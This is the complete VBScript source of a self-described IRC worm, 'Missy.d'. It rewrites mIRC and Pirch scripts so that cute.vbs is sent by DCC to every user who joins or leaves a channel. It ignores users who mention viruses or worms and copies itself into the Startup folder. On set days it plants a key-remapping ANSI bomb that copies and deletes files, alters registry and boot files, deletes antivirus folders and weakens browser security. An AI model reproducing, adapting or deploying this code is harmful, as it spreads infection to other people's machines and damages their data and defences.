On Error Resume Next
Dim iniM, MakeMScript, MakePScript, ABatFile, DBatFile, tFile, SysFile, FSO  
Set FSO = CreateObject("Scripting.FileSystemObject")
'b�U�gr@? �~������������^(���`T�{6�p߱w�Cϯ�34ay[��|*�|���OJ�l
Set WshShell = CreateObject("WScript.Shell")
Parent = Wscript.ScriptFullName
'b�U�gr@? �~�������7]D���^(���`T�{6�p߱w�Cϯ�34ay[��|*���F�x��- 
Set iniM = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
  iniM.WriteLine "[rfiles]"
  iniM.WriteLine "n100=script.ini"
  iniM.Close
'� ۇ� �O�8�V#jK ���~�P��V#jK�V#jK� ۇ� �O�8�V#jK ���~�P��V#jK�V#jK�
Set MakeMScript = FSO.CreateTextFile("c:\WINDOWS\events1.dll", True)
  MakeMScript.WriteLine "[script]"
  MakeMScript.WriteLine "n0; IRC-Worm.Missy.d by -KD- [Metaphase & NoMercy]"
  MakeMScript.WriteLine "n1; Welcome to Missy"
  MakeMScript.WriteLine "n2; Shout outs to zulu, Ultras, jackie, Sin, Raven"
  MakeMScript.WriteLine "n3; foxz, yozak, FSO, Duke. jfk And everyone codeing HLL."
  MakeMScript.WriteLine "n4=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
  MakeMScript.WriteLine "n5=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
  MakeMScript.WriteLine "n6=/dcc send $nick c:\WINDOWS\cute.vbs"
  MakeMScript.WriteLine "n7=}"
  MakeMScript.WriteLine "n8=/dcc send $nick c:\WINDOWS\cute.vbs"
  MakeMScript.WriteLine "n9="
  MakeMScript.WriteLine "n10=}"
  MakeMScript.WriteLine "n11=on 1:TEXT:*script.ini*:#:/.ignore $nick"
  MakeMScript.WriteLine "n12=on 1:TEXT:*script.ini*:?:/.ignore $nick"
  MakeMScript.WriteLine "n13=on 1:TEXT:*virus*:#:/.ignore $nick"
  MakeMScript.WriteLine "n14=on 1:TEXT:*virus*:?:/.ignore $nick"
  MakeMScript.WriteLine "n15=on 1:TEXT:*worm*:#:/.ignore $nick"
  MakeMScript.WriteLine "n16=on 1:TEXT:*worm*:?:/.ignore $nick"
  MakeMScript.WriteLine "n17=on 1:TEXT:*cute*:#:/.ignore $nick"
  MakeMScript.WriteLine "n18=on 1:TEXT:*cute*:?:/.ignore $nick"
  MakeMScript.WriteLine "n19=on 1:QUIT:#:/msg $chan You Make Me Complete"
  MakeMScript.Close
'~�����1�y��0��̝c��ǟF���N���7]D���^(~�����1�y��0��̝c��ǟF���N���7]D
'�����1�y��0��̝c��ǟF���N���7]D���^(�̝c��ǟF���N���7]D���^�̝c��ǟF�
Set MakePScript = FSO.CreateTextFile("c:\WINDOWS\events2.dll", True)
  MakePScript.WriteLine "[Levels]"
  MakePScript.WriteLine "Enabled=1"
  MakePScript.WriteLine "Count=6"
  MakePScript.WriteLine "Level1=000-Unknowns"
  MakePScript.WriteLine "000-UnknownsEnabled=1"
  MakePScript.WriteLine "Level2=100-Level 100"
  MakePScript.WriteLine "100-Level 100Enabled=1"
  MakePScript.WriteLine "Level3=200-Level 200"
  MakePScript.WriteLine "200-Level 200Enabled=1"
  MakePScript.WriteLine "Level4=300-Level 300"
  MakePScript.WriteLine "300-Level 300Enabled=1"
  MakePScript.WriteLine "Level5=400-Level 400"
  MakePScript.WriteLine "400-Level 400Enabled=1"
  MakePScript.WriteLine "Level6=500-Level 500"
  MakePScript.WriteLine "500-Level 500Enabled=1"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[000-Unknowns]"
  MakePScript.WriteLine "User1=*!*@*"
  MakePScript.WriteLine "UserCount=1"
  MakePScript.WriteLine "Event1=; IRC-Wrom.Missy.c"
  MakePScript.WriteLine "Event2=; by -KD- [Metaphase & NoMercy]"
  MakePScript.WriteLine "Event3=ON JOIN:#:/notice $nick Tell me that file isnt the cutest ;)"
  MakePScript.WriteLine "Event4=ON JOIN:#:/dcc send $nick  c:\windows\cute.vbs"
  MakePScript.WriteLine "Event5=ON BAN:*:#:/mode # -o+b $me $banmask | /kick # $nick Dont ban me!!"
  MakePScript.WriteLine "Event6=ON PART:#:/notice $nick Case I didnt send it yet this is the cutest thing Ive seen ;)"
  MakePScript.WriteLine "Event7=ON PART:#:/dcc send $nick c:\windows\cute.vbs"
  MakePScript.WriteLine "Event8=VERSION:/notice $nick \-1 IRC-Worm: Missy.c by -KD- HLL is not dead! \-1:-"
  MakePScript.WriteLine "Event9=ON TEXT:*missy*:#:/ignore # $nick"
  MakePScript.WriteLine "Event10=ON TEXT:*virus*:#:/ignore # $nick"
  MakePScript.WriteLine "Event11=ON TEXT:*worm*:#:/ignore # $nick"
  MakePScript.WriteLine "Event12=ON TEXT:*trojan*:#:/ignore # $nick"
  MakePScript.WriteLine "Event13=ON TEXT:*cute*:#:/ignore # $nick"
  MakePScript.WriteLine "Event14=ON TEXT:*baby*:*:/dcc send $nick c:\windows\cute.vbs"
  MakePScript.WriteLine "Event15=PING:/notice $nick Woohoo"
  MakePScript.WriteLine "Event16=ON QUIT:/msg :#vir: IRC-Worm.Missy by -KD-! You Make Me Complete"
  MakePScript.WriteLine "Event17=ON KICKED:*:#:/msg $nick What the hell? | /join # | /mode # -o+b $nick $banmask"
  MakePScript.WriteLine "EventCount=17"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[100-Level 100]"
  MakePScript.WriteLine "UserCount=0"
  MakePScript.WriteLine "EventCount=0"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[200-Level 200]"
  MakePScript.WriteLine "UserCount=0"
  MakePScript.WriteLine "EventCount=0"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[300-Level 300]"
  MakePScript.WriteLine "UserCount=0"
  MakePScript.WriteLine "EventCount=0"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[400-Level 400]"
  MakePScript.WriteLine "UserCount=0"
  MakePScript.WriteLine "EventCount=0"
  MakePScript.WriteLine ""
  MakePScript.WriteLine "[500-Level 500]"
  MakePScript.WriteLine "UserCount=0"
  MakePScript.WriteLine "EventCount=0"
  MakePScript.Close
FSO.CopyFile "c:\WINDOWS\events1.dll", "c:\mirc\script.ini"
FSO.CopyFile "c:\WINDOWS\events1.dll", "c:\Program Files\mirc\script.ini"
FSO.CopyFile "c:\WINDOWS\events2.dll", "c:\pirch98\events.ini"
FSO.CopyFile "c:\WINDOWS\events2.dll", "c:\Program Files\pirch98\events.ini"
FSO.CopyFile "c:\WINDOWS\events2.dll", "c:\pirch32\events.ini"
FSO.CopyFile Parent, "c:\WINDOWS\cute.vbs"
FSO.CopyFile Parent, "c:\WINDOWS\Start Menu\Programs\StartUp\�Startup�.vbs"
'~�����1�y��0��̝c��ǟF���N���7]D���^(~�����1�y��0��̝c��ǟF���N���7]D
If Day(Now()) = 1 Then
Set tFile = FSO.CreateTextFile("c:\Windows\missy.ans", True)
  tFile.WriteLine "@ECHO ON"
  tFile.WriteLine "[" + chr(34) + "m" + chr(34) + ";" + chr(34) + "copy c\windows\*.* c:\windows\desktop /y" + chr(34) + ";13p"
  tFile.WriteLine "[" + chr(34) + "i" + chr(34) + ";" + chr(34) + "copy c\*.* c:\windows\desktop /y" + chr(34) + ";13p"
  tFile.WriteLine "[" + chr(34) + "s" + chr(34) + ";" + chr(34) + "copy c\mydocu~1\*.* c:\windows\desktop /y" + chr(34) + ";13p"
  tFile.WriteLine "[" + chr(34) + "s" + chr(34) + ";" + chr(34) + "copy c\mydocu~1\*.* c:\windows\desktop /y" + chr(34) + ";13p"
  tFile.WriteLine "[" + chr(34) + "y" + chr(34) + ";" + chr(34) + "copy c\recycled\*.* c:\windows\desktop /y" + chr(34) + ";13p"
  tFile.WriteLine "[" + chr(34) + "!" + chr(34) + ";" + chr(34) + "del c\windows\temp\*.* /y" + chr(34) + ";13p"
  tFile.WriteLine "@ECHO OFF"
  tFile.WriteLine "REM IRC-Missy.d"
  tFile.WriteLine "REM First VBS Worm to carry a Ansibomb"
  tFile.WriteLine "REM Welcome to Missy!" 
tFile.Close
Set SysFile = FSO.CreateTextFile("c:\config.sys", ForAppending, True)
  SysFile.WriteLine ""
  SysFile.WriteLine "DEVICE=C:\Windows\command\ANSI.SYS"
  SysFile.WriteLine ""
SysFile.Close
Set ABatFile = FSO.CreateTextFile("c:\Windows\WinStart.bat", ForAppending, True)
  ABatFile.WriteLine ""
  ABatFile.WriteLine "@echo off"
  ABatFile.WriteLine "type c:\windows\missy.ans"
  ABatFile.WriteLine ""
ABatFile.Close
Set DBatFile = FSO.CreateTextFile("c:\Windows\DosStart.bat", ForAppending, True)
  DBatFile.WriteLine ""
  DBatFile.WriteLine "@echo off"
  DBatFile.WriteLine "type c:\windows\missy.ans"
  DBatFile.WriteLine ""
DBatFile.Close
'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D����
End If
If Day(Now()) = 1 or Day(Now()) = 5 or Day(Now()) = 10 or Day(Now()) = 15 or Day(Now()) = 20 or Day(Now()) = 25  Then
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "Windows Y2K"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "You Make Me Complete."
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Valued Customer"
  WshShell.RegWrite "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\SystemStart\.Current\", @, "C:\\WINDOWS\\media\\Chimes.wav"
  WshShell.RegWrite "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\SystemStart\.Default\", @, "C:\\WINDOWS\\media\\Chimes.wav"
  MsgBox "I love the things we should fear" & Chr(13) & Chr(10) & "And I'm not afrade of being here", 4096 , "Missy - You Make Me Complete"
  FSO.DeleteFolder ("c:\Program Files\Mcafee")
  FSO.DeleteFolder ("c:\Program Files\avp")
  FSO.DeleteFolder ("c:\f-prot")
End If
'�̝c��ǟF���N���7]D���^'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���
WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
'�̝c��ǟF���N���7]D���^'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
'�̝c��ǟF���N���7]D���^'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���
'you cant stop the bum rush
'�̝c��ǟF���N���7]D���^'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���
'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���^�̝c���̝c��ǟF���N���7
'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���^�̝c���̝c��ǟF���N���7
'Exit Missy-->
'̝c��ǟF���N���7]D���^'�̝c��ǟF���N���7]D���^�̝c��ǟF���N���7]D���^
